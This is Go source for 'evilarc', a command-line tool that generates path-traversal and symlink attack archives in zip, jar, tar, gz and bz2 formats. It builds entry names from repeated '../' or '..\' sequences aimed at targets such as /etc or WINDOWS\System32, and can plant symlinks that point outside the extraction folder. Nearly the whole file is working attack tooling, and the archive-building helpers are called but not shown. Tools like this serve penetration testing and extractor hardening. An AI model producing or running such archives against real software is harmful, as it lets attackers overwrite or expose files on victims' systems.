package main

import (
	"fmt"
	"github.com/spf13/cobra"
	"github.com/tarimoe/evilarc/pkg/helper"
	"log"
	"os"
	"path"
	"strings"
)

var rootCmd = &cobra.Command{
	Use:   "evilarc",
	Short: "Create a zip file that contains files with directory traversal characters or symlinks in their embedded path",
	Run: func(cmd *cobra.Command, args []string) {
		version, _ := cmd.Flags().GetBool("version")
		if version {
			fmt.Println("evilarc_v2.1")
		} else {
			_ = cmd.Help()
		}
	},
}

var travelCmd = &cobra.Command{
	Use:   "travel",
	Short: "generate directory traversal attack archive",
	Run: func(cmd *cobra.Command, args []string) {
		handlerTravel(cmd)
	},
}

var symlinksCmd = &cobra.Command{
	Use:   "symlinks",
	Short: "generate symlinks attack archive",
	Run: func(cmd *cobra.Command, args []string) {
		handlerSymlinks(cmd)
	},
}

func init() {
	rootCmd.AddCommand(travelCmd)
	rootCmd.AddCommand(symlinksCmd)
	rootCmd.Flags().BoolP("version", "v", false, "Show version")

	travelCmd.Flags().StringP("plat", "p", "unix", "Platform: [win, unix]")
	travelCmd.Flags().StringP("delimiter", "", "", "Custom path delimiter, Ex: \\/\\/ instead of //")
	travelCmd.Flags().StringP("out", "o", "evil.zip", "Output file, you can also specify xx.[tar.gz,tar,tgz,bz2] ")
	travelCmd.Flags().IntP("travel-depth", "d", 8, "Number of directories to traverse")
	travelCmd.Flags().StringP("travel-include", "i", "", "Local file you want to include \n Ex: . or file/folder")
	travelCmd.Flags().StringP("travel-file", "f", "", "Local file you want to traversal, (leave empty will auto generate a file in archive)")
	travelCmd.Flags().StringP("travel-target", "t", "/etc", "Path to include in filename after traversal.  \n Ex: WINDOWS\\\\System32\\\\<file> or /etc/<file>")
	travelCmd.Flags().StringP("zip-enc", "e", "", "Zip Encrypt method: [standard, AES128, AES192, AES256]")
	travelCmd.Flags().StringP("zip-passwd", "", "", "Zip password")

	symlinksCmd.Flags().StringP("out", "o", "sym-evil.zip", "Output file, you can also specify xx.[tar.gz,tar,tgz,bz2]")
	symlinksCmd.Flags().StringP("sym-name", "n", "evil", "Symlink folder name")
	symlinksCmd.Flags().StringP("sym-target", "t", "/etc", "Path to symlink.  \n Ex: <sym-name> -> /etc")
	symlinksCmd.Flags().StringP("sym-file", "f", "", "local file you want to include, (leave empty will auto generate a file in archive)")
	symlinksCmd.Flags().StringP("zip-enc", "e", "", "Encrypt method: [standard, AES128, AES192, AES256]")
	symlinksCmd.Flags().StringP("zip-passwd", "", "", "Zip password")

}

func handlerTravel(cmd *cobra.Command) {
	plat, _ := cmd.Flags().GetString("plat")
	delimiter, _ := cmd.Flags().GetString("delimiter")
	outFile, _ := cmd.Flags().GetString("out")
	travelDepth, _ := cmd.Flags().GetInt("travel-depth")
	//travelInclude, _ := cmd.Flags().GetString("travel-include")
	travelFile, _ := cmd.Flags().GetString("travel-file")
	travelTarget, _ := cmd.Flags().GetString("travel-target")
	zipEnc, _ := cmd.Flags().GetString("zip-enc")
	zipPasswd, _ := cmd.Flags().GetString("zip-passwd")

	if !strings.HasSuffix(travelTarget, "/") {
		travelTarget = travelTarget + "/"
	}
	travelTarget = strings.TrimPrefix(travelTarget, "/")

	var platDel string
	switch plat {
	case "win":
		platDel = "..\\"
	case "unix":
		platDel = "../"
	}

	if delimiter != "" {
		platDel = delimiter
	}

	of, inputContent := prepare(&travelFile, outFile)
	defer of.Close()

	filename := fmt.Sprintf("%s%s%s", strings.Repeat(platDel, travelDepth), travelTarget, travelFile)

	switch path.Ext(of.Name()) {
	case ".zip", ".jar":
		helper.CreateZip(of, inputContent, filename, zipPasswd, zipEnc)
	case ".tar":
		helper.CreateTar(filename, of, inputContent)
	case ".gz", ".tgz":
		helper.CreateTarGZ(filename, of, inputContent)
	case ".bz2":
		helper.CreateBZ2(filename, of, inputContent)
	default:
		panic("Could not identify target format. Choose from: .zip, .jar, .tar, .gz, .tgz, .bz2")
	}

	log.Printf("The filename in the archive is: %s\n", filename)
	log.Println("[+] generate: " + of.Name())
}

func handlerSymlinks(cmd *cobra.Command) {
	symName, _ := cmd.Flags().GetString("sym-name")
	symTarget, _ := cmd.Flags().GetString("sym-target")
	symOut, _ := cmd.Flags().GetString("out")
	symFile, _ := cmd.Flags().GetString("sym-file")
	zipEnc, _ := cmd.Flags().GetString("zip-enc")
	password, _ := cmd.Flags().GetString("zip-passwd")

	of, inputContent := prepare(&symFile, symOut)
	defer of.Close()

	switch path.Ext(of.Name()) {
	case ".zip", ".jar":
		helper.CreateSymZip(of, inputContent, symFile, symName, symTarget, password, zipEnc)
	case ".tar":
		helper.CreateSymTar(of, inputContent, symFile, symName, symTarget)
	case ".gz", ".tgz":
		helper.CreateSymTarGZ(of, inputContent, symFile, symName, symTarget)
	case ".bz2":
		helper.CreateSymBZ2(of, inputContent, symFile, symName, symTarget)
	default:
		panic("Could not identify target format. Choose from: .zip, .jar, .tar, .gz, .tgz, .bz2")
	}

	symNamePath := path.Join(symName, symFile)
	synTargetPath := path.Join(symTarget, symFile)
	log.Printf("Relationship of symlink: %s -> %s\n", symNamePath, synTargetPath)
	log.Println("[+] generate: " + of.Name())
}

func prepare(file *string, out string) (*os.File, []byte) {
	empty := false
	if *file == "" {
		*file = "test_arc.txt"
		empty = true
	}

	var inputContent []byte
	var err error
	if empty {
		inputContent = []byte("test content")
	} else {
		inputContent, err = os.ReadFile(*file)
		if err != nil {
			panic(err)
		}
	}

	// Create output file
	of, err := os.Create(out)
	if err != nil {
		panic(err)
	}

	return of, inputContent
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		log.Println(err)
		os.Exit(1)
	}
}
